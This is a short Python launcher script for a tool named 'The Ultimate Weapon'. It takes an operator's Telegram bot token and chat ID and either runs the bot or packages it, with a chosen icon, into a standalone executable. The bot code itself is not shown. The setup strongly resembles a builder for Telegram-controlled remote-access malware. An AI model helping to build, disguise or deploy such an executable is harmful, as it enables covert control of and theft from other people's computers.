# main.py
import time
from setup import start_bot, create_exe

def print_logo():
    logo = r"""
       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        _______   _    _   __        __
       |__   __| | |  | |  \ \      / /
          | |    | |  | |   \ \ /\ / /
          | |    | |  | |    \ V  V /
          |_|     \____/      \_/\_/

             The Ultimate Weapon
       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

        Created by Kanxer (Sahil Lala)
    """
    print(logo)
    print("🧠 TUW Bot Setup\n")

print_logo()
time.sleep(1)

# Telegram credentials
BOT_TOKEN = input("🔐 Enter your Telegram Bot Token: ").strip()
CHAT_ID = int(input("💬 Enter your Telegram Chat ID: ").strip())

# User selects action first
print("\nSelect action:\n")
print("1. Build executable\n")
print("2. Run bot directly\n")
action_choice = input("Enter 1 or 2: >> ").strip()

if action_choice == "1":
    print('''
	Note:-
             1. If you Have run this script in windows 
             	it will create a exe file or if you are
             	in linux distro it will create .bin
             2. If You are on windows select .ico
		image for icon or if you are on linux
		select .png image for icon 
	''')
    icon_path = input("🖼 Enter path to icon file (.ico/.png) or leave empty: ").strip()
    create_exe(BOT_TOKEN, CHAT_ID, icon_path)
elif action_choice == "2":
    start_bot(BOT_TOKEN, CHAT_ID)
else:
    print("❌ Invalid action choice.")
